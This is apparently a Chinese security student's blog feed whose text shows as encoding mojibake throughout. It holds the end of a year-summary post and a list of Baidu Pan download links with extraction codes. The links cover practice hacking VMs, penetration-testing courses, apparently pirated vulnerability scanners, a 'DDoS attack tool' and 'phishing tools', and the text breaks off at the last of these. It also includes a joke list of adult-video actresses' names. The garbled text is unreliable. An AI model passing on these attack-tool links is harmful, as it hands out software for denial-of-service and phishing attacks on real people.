ä¸ºè¿™å­¦æœŸæœ‰å¤§ç‰©ï¼Œæ•°ç”µç­‰æ¶å¿ƒè¯¾ç¨‹ï¼Œä¸ºäº†ä¸æŒ‚ç§‘æˆ‘ä¸å¾—ä¸èŠ±ä¸Šç‚¹åŠŸå¤«å‡†å¤‡ï¼Œå°±è¿™æ ·æˆ‘æˆä¸ºäº†æˆ‘ä»¬å®¿èˆå”¯ä¸€ä¸€ä¸ªæ²¡æœ‰æŒ‚ç§‘çš„ï¼ˆæˆ‘ï¼šä¸ä¼šçœŸæœ‰äººæŒ‚äº†å§ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/231189754.png"></p><h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><p>ç‚¹äº®2021ï¼š<br>åªè¦å¯¹ç†æƒ³è¶³å¤Ÿåšå®šï¼Œä¸€è·¯ä¸Šè‡ªç„¶ä¼šæ”¶è·æ”¯æŒå’Œå…±é¸£ï¼ï¼ˆæˆ‘å‘¸~å¹´å°‘ä¸çŸ¥è½¯é¥­é¦™ï¼Œé”™æŠŠé’æ˜¥å­¦æ¸—é€ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/105924743.png"></p><p>æœ€åç¥æ„¿Gammaå®éªŒå®¤è¶Šæ¥è¶Šå¥½ï¼å„ä½å¸ˆå‚…ä»¬å¤šå¸¦å¸¦æˆ‘~</p><h1 id="æ–‡æœ«ç¦åˆ©-å¤§çº¢åŒ…"><a href="#æ–‡æœ«ç¦åˆ©-å¤§çº¢åŒ…" class="headerlink" title="æ–‡æœ«ç¦åˆ©-å¤§çº¢åŒ…"></a>æ–‡æœ«ç¦åˆ©-å¤§çº¢åŒ…</h1><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2896322130.png"></p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ€»ç»“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ èµ„æ–™</title>
      <link href="2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
      <url>2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2988852155.webp"></p><p>ç›¸ä¿¡æˆ‘ï¼çœŸçš„éƒ½æ˜¯å­¦ä¹ èµ„æ–™å“¦~~<br>å¤§æ³½æµ+æœæ²³å…°+é»’æ²¢çˆ±+æ—©é˜ªã²ã¨ã¿(æ—©é˜ªæ›ˆ)+æ¥ç”Ÿã²ã‹ã‚Š(æ¥ç”Ÿå…‰)+æ˜Ÿå´æœªæ¥+è‹äº•ãã‚‰(è‹äº•ç©º)+é«˜æ ‘ãƒãƒªã‚¢(é«˜æ ‘ç›ä¸½äºš)+ç¾ç«¹å‡‰å­+æ¾å²›ã‹ãˆã§(æ¾å²›æ«)+å—æ³¢æ+å‰æ²¢æ˜æ­©+å°æ³‰å½©+æ¡œæœ±éŸ³+é¦™å±±åœ£+ç™½é¸Ÿã•ãã‚‰(ç™½é¸Ÿæ¨±)</p><h2 id="é¶æœºèµ„æºåˆé›†"><a href="#é¶æœºèµ„æºåˆé›†" class="headerlink" title="é¶æœºèµ„æºåˆé›†"></a>é¶æœºèµ„æºåˆé›†</h2><h3 id="DCé¶æœº1-9"><a href="#DCé¶æœº1-9" class="headerlink" title="DCé¶æœº1-9"></a>DCé¶æœº1-9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1FKj5puh7FvsvxzfjAr8uDQ</span><br><span class="line">æå–ç ï¼šqlm9</span><br></pre></td></tr></table></figure><p>ä¸‹è½½è§£å‹ï¼Œç”¨vmï¼Œæˆ–è€…vboxæ‰“å¼€<br>è®¾ç½®ç½‘ç»œé…ç½®å™¨ä¸ºä¸æ”»å‡»æœºä¸€ä¸ªç½‘æ®µï¼Œå³å¯å¼€å§‹æ¸—é€æµ‹è¯•ï¼</p><h3 id="å“†å•¦å®æˆ˜é¶åœº"><a href="#å“†å•¦å®æˆ˜é¶åœº" class="headerlink" title="å“†å•¦å®æˆ˜é¶åœº"></a>å“†å•¦å®æˆ˜é¶åœº</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1vt-lGt86sNLJd77a0QD8gA</span><br><span class="line">æå–ç ï¼šktfs</span><br></pre></td></tr></table></figure><p><strong>æ­å»ºæ–¹æ³•</strong></p><p>å‡†å¤‡å·¥å…·ï¼šphpstudyï¼Œå“†å•¦é¶åœºæºç <br>è¿è¡Œphpstudyï¼Œè§£å‹å“†å•¦æºç åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹<br>æµè§ˆå™¨æ‰“å¼€é¶åœº<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021500758.png"></p><p>å…ˆå®‰è£…sqliçš„æ•°æ®åº“ï¼Œè¿›å»sqlç»ƒä¹ é¶åœºï¼Œç‚¹å‡»å»ºç«‹æ•°æ®åº“</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2244398992.png"></p><p>ä¼šå‘ç°å‡ºç°è¿™æ ·çš„é”™è¯¯é¡µé¢</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2623449734.png"></p><p>è¿™æ˜¯å› ä¸ºæ²¡æœ‰è¿æ¥ä¸Šæ•°æ®åº“<br>æ‰“å¼€è¿æ¥æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹è¿æ¥çš„è´¦æˆ·ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3122021978.webp"></p><p>åœ¨dbpassä¸­å¡«å…¥æœ¬åœ°mysqlæ•°æ®åº“rootè´¦å·çš„å¯†ç ï¼Œä¸€èˆ¬phpstudyæ•°æ®åº“å¯†ç ä¸ºrootï¼Œå¦‚æœæ²¡æ”¹çš„è¯</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3910040810.png"></p><p>ç„¶ååœ¨è¿›å…¥ç½‘é¡µï¼Œåˆ›å»ºæ•°æ®åº“ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2742581375.png"></p><p>æˆåŠŸäº†ï¼Œç„¶åå°±å¯ä»¥æ„‰å¿«çš„æ³¨å…¥äº†</p><hr><h2 id="ç¼–ç¨‹èµ„æºåˆé›†"><a href="#ç¼–ç¨‹èµ„æºåˆé›†" class="headerlink" title="ç¼–ç¨‹èµ„æºåˆé›†"></a>ç¼–ç¨‹èµ„æºåˆé›†</h2><h3 id="pythonç½‘ç»œå®‰å…¨ç¼–ç¨‹"><a href="#pythonç½‘ç»œå®‰å…¨ç¼–ç¨‹" class="headerlink" title="pythonç½‘ç»œå®‰å…¨ç¼–ç¨‹"></a>pythonç½‘ç»œå®‰å…¨ç¼–ç¨‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1KI-ULRZnErj0DIt8gWQeig</span><br><span class="line">æå–ç ï¼šlfrd</span><br></pre></td></tr></table></figure><h3 id="python400é›†ï¼š"><a href="#python400é›†ï¼š" class="headerlink" title="python400é›†ï¼š"></a>python400é›†ï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1hchZtN_XmQi2RFMByzB4Bw</span><br><span class="line">æå–ç ï¼š07w7</span><br></pre></td></tr></table></figure><h3 id="phpä»£ç å®¡è®¡"><a href="#phpä»£ç å®¡è®¡" class="headerlink" title="phpä»£ç å®¡è®¡"></a>phpä»£ç å®¡è®¡</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1CddqFNMrdIkfBD7Q4kf3yg</span><br><span class="line">æå–ç ï¼šre14</span><br></pre></td></tr></table></figure><h3 id="phpé«˜çº§æ•™ç¨‹"><a href="#phpé«˜çº§æ•™ç¨‹" class="headerlink" title="phpé«˜çº§æ•™ç¨‹"></a>phpé«˜çº§æ•™ç¨‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1rsJmIZpwwmftvnlujD_1Ww</span><br><span class="line">æå–ç ï¼š7wfm</span><br></pre></td></tr></table></figure><h3 id="PHPä¸mysql"><a href="#PHPä¸mysql" class="headerlink" title="PHPä¸mysql"></a>PHPä¸mysql</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;16ZsYk1jSnUfvg3D3CH3koQ</span><br><span class="line">æå–ç ï¼šnjb2</span><br></pre></td></tr></table></figure><h3 id="PHPä»å…¥é—¨åˆ°ç²¾é€š"><a href="#PHPä»å…¥é—¨åˆ°ç²¾é€š" class="headerlink" title="PHPä»å…¥é—¨åˆ°ç²¾é€š"></a>PHPä»å…¥é—¨åˆ°ç²¾é€š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;16OdAoJ70uqmJgMcD6LZkEQ</span><br><span class="line">æå–ç ï¼šjg1v</span><br></pre></td></tr></table></figure><h3 id="WEBå¼€å‘"><a href="#WEBå¼€å‘" class="headerlink" title="WEBå¼€å‘"></a>WEBå¼€å‘</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1LuYoKmDIlqJ4mgV_pJBMYA</span><br><span class="line">æå–ç ï¼šiu7e</span><br></pre></td></tr></table></figure><h3 id="JSæ•™ç¨‹"><a href="#JSæ•™ç¨‹" class="headerlink" title="JSæ•™ç¨‹"></a>JSæ•™ç¨‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1KAycKKjtwvuVqpU7QayGXQ</span><br><span class="line">æå–ç ï¼šxuc3</span><br></pre></td></tr></table></figure><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Umirm6Y7JqpIwdPBGysjNw</span><br><span class="line">æå–ç ï¼š95i0</span><br></pre></td></tr></table></figure><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1DsVdxs3aOYQR0lL9csOU4A</span><br><span class="line">æå–ç ï¼š2tnp</span><br></pre></td></tr></table></figure><hr><h2 id="æ¸—é€èµ„æºåˆé›†"><a href="#æ¸—é€èµ„æºåˆé›†" class="headerlink" title="æ¸—é€èµ„æºåˆé›†"></a>æ¸—é€èµ„æºåˆé›†</h2><h3 id="WEBæ¸—é€å·¥ç¨‹å¸ˆå¿…çœ‹"><a href="#WEBæ¸—é€å·¥ç¨‹å¸ˆå¿…çœ‹" class="headerlink" title="WEBæ¸—é€å·¥ç¨‹å¸ˆå¿…çœ‹"></a>WEBæ¸—é€å·¥ç¨‹å¸ˆå¿…çœ‹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">åƒé”‹ç½‘ç»œå®‰å…¨å…¨å¥—è§†é¢‘</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1hCNJZv18ZDA5_3SBIxyg9w</span><br><span class="line">æå–ç ï¼šdaf2</span><br><span class="line"></span><br><span class="line">SRCæŒ–æ˜æŒ‡å—ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1vTpPaDNiTDs8UgTulfWylA</span><br><span class="line">æå–ç ï¼štffk</span><br></pre></td></tr></table></figure><h3 id="ARMèµ„æ–™å¤§å…¨"><a href="#ARMèµ„æ–™å¤§å…¨" class="headerlink" title="ARMèµ„æ–™å¤§å…¨"></a>ARMèµ„æ–™å¤§å…¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1METTjhXCKVykyV-SNW0AYg</span><br><span class="line">æå–ç ï¼š2x9t</span><br></pre></td></tr></table></figure><h3 id="æœ€å…¨é€†å‘ç»¼åˆä¹¦ç±"><a href="#æœ€å…¨é€†å‘ç»¼åˆä¹¦ç±" class="headerlink" title="æœ€å…¨é€†å‘ç»¼åˆä¹¦ç±"></a>æœ€å…¨é€†å‘ç»¼åˆä¹¦ç±</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Yo2lmZcswJXLE_2pdgvkUg</span><br><span class="line">æå–ç ï¼š97pg</span><br></pre></td></tr></table></figure><h3 id="æ¸—é€ç»¼åˆä¹¦ç±"><a href="#æ¸—é€ç»¼åˆä¹¦ç±" class="headerlink" title="æ¸—é€ç»¼åˆä¹¦ç±"></a>æ¸—é€ç»¼åˆä¹¦ç±</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é«˜åº¦å®‰å…¨ç¯å¢ƒä¸‹çš„æ¸—é€æµ‹è¯•ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;15EMz-uCkZQQ-P-9pWldHeg</span><br><span class="line">æå–ç ï¼šxe35</span><br><span class="line"></span><br><span class="line">ç½‘ç»œæ”»é˜²å®æˆ˜ç ”ç©¶-ææƒ</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1_s8HZWytQR8_obSoiEjaxQ</span><br><span class="line">æå–ç ï¼š5umj</span><br></pre></td></tr></table></figure><h3 id="æˆ‘çˆ±kaliï¼Œkaliå…¨å¥—è§†é¢‘æ•™å­¦"><a href="#æˆ‘çˆ±kaliï¼Œkaliå…¨å¥—è§†é¢‘æ•™å­¦" class="headerlink" title="æˆ‘çˆ±kaliï¼Œkaliå…¨å¥—è§†é¢‘æ•™å­¦"></a>æˆ‘çˆ±kaliï¼Œkaliå…¨å¥—è§†é¢‘æ•™å­¦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">å…¨å¥—å­¦ä¹ èµ„æ–™ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1zNvowFfqB9oRd_P8PukKwg</span><br><span class="line">æå–ç ï¼šy9u3</span><br><span class="line"></span><br><span class="line">metasploitå†…ç½‘æ¸—é€æŒ‡å—</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1F4AwBD8Itd0IEh9ol_LsGg</span><br><span class="line">æå–ç ï¼šmd1b</span><br><span class="line"></span><br><span class="line">ä»å®è·µä¸­å­¦ä¹ kaliå…¨å¥—èµ„æº</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1PN9KyFErMRbg2yMV29G5HQ</span><br><span class="line">æå–ç ï¼škkj1</span><br></pre></td></tr></table></figure><h3 id="å†…ç½‘æ¸—é€ä¹¦ç±åˆé›†"><a href="#å†…ç½‘æ¸—é€ä¹¦ç±åˆé›†" class="headerlink" title="å†…ç½‘æ¸—é€ä¹¦ç±åˆé›†"></a>å†…ç½‘æ¸—é€ä¹¦ç±åˆé›†</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfå†…ç½‘æ¸—é€ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;11MejsJs4lqLVPq-4A0hB_A</span><br><span class="line">æå–ç ï¼še1jj</span><br></pre></td></tr></table></figure><h3 id="WEBæ¸—é€è§†é¢‘åˆé›†"><a href="#WEBæ¸—é€è§†é¢‘åˆé›†" class="headerlink" title="WEBæ¸—é€è§†é¢‘åˆé›†"></a>WEBæ¸—é€è§†é¢‘åˆé›†</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">å°è¿ªæ¸—é€ä¸“æ ï¼š</span><br><span class="line">2018-2019</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1rHsxEtQbXuvNlWA6nm-tdg</span><br><span class="line">æå–ç ï¼štn7o    </span><br><span class="line">2019</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1CrO4luPuuAUYnNEJvFiTPA</span><br><span class="line">æå–ç ï¼šh155        </span><br><span class="line">2012</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Q-2Xfcu2fWc0rAYBuBUlRw</span><br><span class="line">æå–ç ï¼šzt85</span><br><span class="line">2014-2015åç»­</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1D6diGpXRDCtkuON_8zGAEA</span><br><span class="line">æå–ç ï¼šow48</span><br><span class="line">2014å…è´¹å¯¹å¤–è®²</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1a3wtBPKJI92QjvriFQ3wwA</span><br><span class="line">æå–ç ï¼ša4tb        </span><br><span class="line">2015WEBæ¸—é€é«˜çº§ç¯‡</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1PjNyb-dTSZ8l81tfbBudPg</span><br><span class="line">æå–ç ï¼šlsg1        </span><br><span class="line">2015å…¨æ–°WEBæ¸—é€æµ‹è¯•</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1jnHdfSixXxQcGwO-Yc5jwA</span><br><span class="line">æå–ç ï¼šf28x</span><br><span class="line">æ¸—é€æµ‹è¯•åŸ¹è®­ç¬¬6æœŸ</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Aw5XF_xBMbM8jgjc_3MkgA</span><br><span class="line">æå–ç ï¼šdrda        </span><br><span class="line">æ¸—é€æµ‹è¯•åŸ¹è®­ç¬¬7æœŸ</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1_vlGHld6piM1O9BvJL_SGw</span><br><span class="line">æå–ç ï¼štgyj             </span><br><span class="line">æ¸—é€æµ‹è¯•åŸ¹è®­ç¬¬5æœŸ</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1YHjGMGfNseejAzBmeEw4iw</span><br><span class="line">æå–ç ï¼š0935</span><br><span class="line"></span><br><span class="line">å®æˆ˜WEBæ¸—é€ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1rlTLc4yujmbmUyThzYDz6g</span><br><span class="line">æå–ç ï¼šcrom                       </span><br><span class="line">        </span><br><span class="line">æš—æœˆæ¸—é€ç²¾å“ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1a1_vNQOrdzbBdVDUeM4o2g</span><br><span class="line">æå–ç ï¼šmczl</span><br><span class="line">   </span><br><span class="line">2013å¹´é¥­å®¢å¤§å‹èŒä¸šå…¥ä¾µæ¸—é€åŸ¹è®­ç­ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1FscgnGob4k5VhqxNJDkUIQ</span><br><span class="line">æå–ç ï¼šldyk</span><br><span class="line">            </span><br><span class="line">2014å¹´å¤§å‹å®æˆ˜ç½‘ç«™å…¥ä¾µï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1QT3av6azDqR6UFlsncvqhg</span><br><span class="line">æå–ç ï¼šde7w</span><br><span class="line"></span><br><span class="line">ç™½å¸½å­é«˜ç«¯ä¿¡æ¯å®‰å…¨æ•™ç¨‹ï¼š        </span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17sGIygCyaADC0Gje2zmHpg</span><br><span class="line">æå–ç ï¼šfx1j</span><br><span class="line"></span><br><span class="line">WEBå®‰å…¨åŸºç¡€ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1vaHcvq2jgsspuUFlc3mYDg</span><br><span class="line">æå–ç ï¼šyj34</span><br><span class="line"></span><br><span class="line">ç½‘ç»œå®‰å…¨å…¨å¥—è§†é¢‘ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1G34aN7G1tnXGKVZ4uYukHg</span><br><span class="line">æå–ç ï¼šlxum</span><br></pre></td></tr></table></figure><hr><h2 id="å·¥å…·ç¯‡"><a href="#å·¥å…·ç¯‡" class="headerlink" title="å·¥å…·ç¯‡"></a>å·¥å…·ç¯‡</h2><h3 id="PWNä¸“ç”¨è™šæ‹Ÿæœº"><a href="#PWNä¸“ç”¨è™šæ‹Ÿæœº" class="headerlink" title="PWNä¸“ç”¨è™šæ‹Ÿæœº"></a>PWNä¸“ç”¨è™šæ‹Ÿæœº</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ubentu16ä¸“ç”¨è™šæ‹Ÿæœºï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1s69aOXxi38uW9mp_x9RsNA</span><br><span class="line">æå–ç ï¼šilzs</span><br><span class="line"></span><br><span class="line">linux64ä½pwnä¸“ç”¨è™šæ‹Ÿæœºï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Q7xQ48o3D95euhPRkXoq2A</span><br><span class="line">æå–ç ï¼šfy3q</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´æ‰«æå·¥å…·"><a href="#æ¼æ´æ‰«æå·¥å…·" class="headerlink" title="æ¼æ´æ‰«æå·¥å…·"></a>æ¼æ´æ‰«æå·¥å…·</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AWVS-13</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1A5rMPqpFhhkPdzDUMhHwcQ</span><br><span class="line">æå–ç ï¼šufad</span><br><span class="line"></span><br><span class="line">APPSCAN8.7</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17fJ0IEv9leX4_lpRSAuX6w</span><br><span class="line">æå–ç ï¼š1brz</span><br><span class="line"></span><br><span class="line">AWVS12</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1N9JCr8B6WIgBwTtIvbOWNw</span><br><span class="line">æå–ç ï¼šbw4x</span><br></pre></td></tr></table></figure><h3 id="æ‚é¡¹å·¥å…·é›†åˆ"><a href="#æ‚é¡¹å·¥å…·é›†åˆ" class="headerlink" title="æ‚é¡¹å·¥å…·é›†åˆ"></a>æ‚é¡¹å·¥å…·é›†åˆ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ddosæ”»å‡»è½¯ä»¶å·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;17VwuGArtA-MQRNC4Yj9kXw</span><br><span class="line">æå–ç ï¼štuxr</span><br><span class="line"></span><br><span class="line">é’“é±¼å·¥å…·ï¼š</span><br><span 